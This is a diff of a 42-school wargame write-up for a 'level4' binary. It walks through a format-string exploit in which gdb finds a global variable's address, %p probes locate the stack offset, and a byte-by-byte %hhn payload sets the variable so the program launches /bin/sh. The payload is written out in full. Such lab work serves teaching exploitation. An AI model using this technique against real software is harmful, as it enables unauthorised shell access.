@@ -6,9 +6,48 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:17 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 18:53:00 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/04 20:01:05 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
-//write bullshit bit by bit
-echo -e "\x13\x98\x04\x08\x12\x98\x04\x08\x10\x98\x04\x08\x11\x98\x04\x08%240d %12\$hhn %13\$hhn %65d%14\$hhn %16d%15\$hhn" > /tmp/t
+The executable uses a user-provided format string again
+
+It then checks a global variable to decide if it should launch '/bin/sh'
+
+This time the variable is much larger
+
+Get the pointer to the global variable
+> i var m
+The pointer is 0x08049810
+
+Get the value that it needs to be
+> disas v
+The value is $0x1025544, or byte-wise 0x44 0x55 0x02 0x01, or 68 85 2 1 in decimal
+
+Get the offset of the format string in the stack
+> ./level4
+---------------------------------- %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+---------------------------------- 0x200 0xb7fd1ac0 0xb7ff37d0 0x2d2d2d2d [...]
+The value is 12
+
+# Write the pointers to each byte on the stack in ascending order of desired value,
+
+echo -e -n "\x13\x98\x04\x08" > /tmp/u
+echo -e -n "\x12\x98\x04\x08" >> /tmp/u
+echo -e -n "\x10\x98\x04\x08" >> /tmp/u
+echo -e -n "\x11\x98\x04\x08" >> /tmp/u
+
+# Reset the value counter
+
+echo -e -n "%240d" >> /tmp/u
+
+# Write the amount of chars needed for each value then write the value using %n
+
+echo -e -n " %12\$hhn" >> /tmp/u
+echo -e -n " %13\$hhn" >> /tmp/u
+echo -e -n "%66d%14\$hhn" >> /tmp/u
+echo -e -n "%16d%15\$hhn" >> /tmp/u
+
+# Feed to executable
+
+cat /tmp/u - ./level4
